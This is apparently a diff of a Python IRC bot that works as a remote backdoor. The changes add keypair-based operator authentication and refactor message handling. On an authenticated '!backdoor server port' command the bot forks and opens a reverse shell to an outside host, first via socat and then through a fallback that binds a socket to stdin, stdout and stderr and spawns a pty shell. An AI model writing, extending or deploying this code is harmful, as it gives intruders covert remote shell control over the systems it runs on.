@@ -10,23 +10,27 @@ socat file:`tty`,raw,echo=0 tcp-listen:$port
 
 from rocksock import Rocksock, RocksockException
 from irc import RsIRC
+from nacl_wrapper import gen_keypair, handshake_challenge, handshake_response, \
+handshake_response_verify, arrtohex, hextoarr
+import sys
+from config import Config
 
-import config
+config = Config()
 
-def print_exception(irc, channel, lines):
+def print_exception(nick, lines):
 	for line in lines.splitlines():
-		irc.privmsg(channel, line)
+		config.irc.privmsg(nick, line)
 
-def dprint(irc, channel, msg):
-	if config.debug: irc.privmsg(channel, "[DEBUG] " + msg)
+def dprint(channel, msg):
+	if config.debug: config.irc.privmsg(channel, "[DEBUG] " + msg)
 
-def dumb_backdoor(irc, channel, server, port):
+def dumb_backdoor(irc, nick, server, port):
 	import pty, socket, os
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
-		dprint(irc, channel, "connect")
+		dprint(nick, "connect")
 		s.connect((server, port))
-		dprint(irc, channel, "connected!")
+		dprint(nick, "connected!")
 		os.dup2(s.fileno(),0)
 		os.dup2(s.fileno(),1)
 		os.dup2(s.fileno(),2)
@@ -34,14 +38,14 @@ def dumb_backdoor(irc, channel, server, port):
 		pty.spawn(config.shell)
 	except Exception as e:
 		import traceback
-		print_exception(irc, channel, traceback.format_exc())
+		print_exception(nick, traceback.format_exc())
 
-def backdoor(irc, channel, server, port):
+def backdoor(nick, server, port):
 	import os
 	import shlex
 	import traceback
 
-	dprint(irc, channel, "running backdoor to %s:%d"%(server, port))
+	dprint(nick, "running backdoor to %s:%d"%(server, port))
 
 	pid = os.fork()
 	if pid == 0: #child
@@ -51,31 +55,80 @@ def backdoor(irc, channel, server, port):
 			os.execvp('socat', cmdarr)
 			#os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
 		except OSError as e:
-			dprint(irc, channel, "got socat error")
+			dprint(nick, "got socat error")
 			if e.errno == os.errno.ENOENT:
-				dprint(irc, channel, "trying dumb backdoor")
-				dumb_backdoor(irc, channel, server, port)
+				dprint(nick, "trying dumb backdoor")
+				dumb_backdoor(nick, server, port)
 			else:
-				print_exception(irc, channel, traceback.format_exc())
+				print_exception(nick, traceback.format_exc())
 		# catch child process on exception/after dumb shell
 		os.execlp("/bin/true", "/bin/true")
 
-def addresses_bot(word, nickname):
-	return word == nickname or word == nickname + ':' or word == nickname + ','
+def process_privmsg(nick, mask, dest, text):
 
-if __name__ == '__main__':
+	def addresses_bot(word, nickname):
+		return word == nickname or word == nickname + ':' or word == nickname + ','
+
+	text = text.lstrip(':')
+	words = text.split(' ')
+	if addresses_bot(words[0], config.irc.nickname): words = words[1:]
+	elif not dest == config.irc.nickname: return
+	if len(words) == 0: return
+
+	if mask.startswith('~'): mask = mask[1:]
+
+	if words[0] == "!auth" and config.bot_sk and config.bot_pk and config.opkey:
+		chall = handshake_challenge(config.bot_pk)
+		config.irc.privmsg(nick, chall)
+		config.auth_request = "%s:%s"%(nick, chall)
+	elif config.auth_request and config.auth_request.split(':')[0] == nick:
+		if handshake_response_verify(config.auth_request.split(':')[1], words[0], hextoarr(config.opkey), config.bot_sk):
+			config.opmask = mask
+			config.irc.privmsg(nick, "auth successful, master")
+		else: config.irc.privmsg(nick, "auth failed")
+		config.auth_request = None
+	elif config.opmask and mask == config.opmask:
+		if words[0] == "!backdoor":
+			try:
+				if len(words) == 3:
+					backdoor(nick, words[1], int(words[2]))
+				elif len(words) == 2 and config.backdoorserver:
+					backdoor(nick, config.backdoorserver, int(words[1]))
+			except Exception as e:
+				import traceback
+				print_exception(nick, traceback.format_exc())
+		elif words[0] == "!help":
+			config.irc.privmsg(nick, "!auth, !backdoor server port")
+
+def main():
 	import time
+	config.load()
+	if config.args.genkey:
+		pk, sk = gen_keypair()
+		print "public_key = '" + arrtohex(pk) + "'"
+		print "secret_key = '" + arrtohex(sk) + "'"
+		sys.exit(0)
+	elif config.args.challenge:
+		print "generating handshake response, hold your breath..."
+		ret, resp = handshake_response(config.args.challenge, hextoarr(config.opkey), hextoarr(config.privkey))
+		if ret != 0: print "FAIL"
+		else: print resp
+		sys.exit(ret)
+	if not config.opmask:
+		print "generating keypair... hold your breath"
+		config.bot_pk, config.bot_sk = gen_keypair()
+		print "done"
 
-	irc = RsIRC(host=config.host, port=config.port, timeout=180, ssl=config.ssl, nickname=config.botnick, username='blah', proxies=config.proxies)
-	irc.reconnect()
+	config.irc = RsIRC(host=config.host, port=config.port, timeout=180, ssl=config.ssl, nickname=config.botnick, username='blah', proxies=config.proxies)
+	config.irc.reconnect()
 	while True:
-		s = irc.readline()
+		s = config.irc.readline()
 		try:
 			a,b,c = s.split(' ', 2)
 		except:
 			a, b = s.split(' ')
 			if a == 'PING':
-				irc.sendl('PONG %s'%b)
+				config.irc.sendl('PONG %s'%b)
 			else:
 				print "WEIRD COMMAND:" + s
 				continue
@@ -83,32 +136,26 @@ if __name__ == '__main__':
 		#print "B = ___" + b + "___"
 		if b == "433": #name in use
 			print "nick in use, appending _ ..."
-			irc.nickname = irc.nickname + "_"
-			irc.reconnect()
+			config.irc.nickname = config.irc.nickname + "_"
+			config.irc.reconnect()
 		elif b == '376': #MOTD finish
-			irc.sendl('JOIN %s'%config.channel)
+			config.irc.sendl('JOIN %s'%config.channel)
 		elif b == "PRIVMSG":
 			a,b,c,d = s.split(' ', 3)
 			a = a.lstrip(':')
 			try:
 				nick, mask = a.split('!')
 			except:
-				irc.privmsg(config.channel, "OOPS " + a)
+				config.irc.privmsg(config.channel, "OOPS " + a)
 				nick = ""
 				mask = ""
-			if mask.startswith('~'): mask = mask[1:]
-			if mask == config.opmask:
-				d = d.lstrip(':')
-				words = d.split(' ')
-				if addresses_bot(words[0], irc.nickname):
-					try:
-						if len(words) == 3:
-							backdoor(irc, config.channel, words[1], int(words[2]))
-						elif len(words) == 2:
-							backdoor(irc, config.channel, config.backdoorserver, int(words[1]))
-					except Exception as e:
-						import traceback
-						print_exception(irc, config.channel, traceback.format_exc())
+				continue
+
+			process_privmsg(nick, mask, c, d)
 
 		if not s: continue
-		print s
+		if not config.quiet and not (config.quietpriv and b == 'PRIVMSG'):
+			print s
+
+if __name__ == '__main__':
+	main()
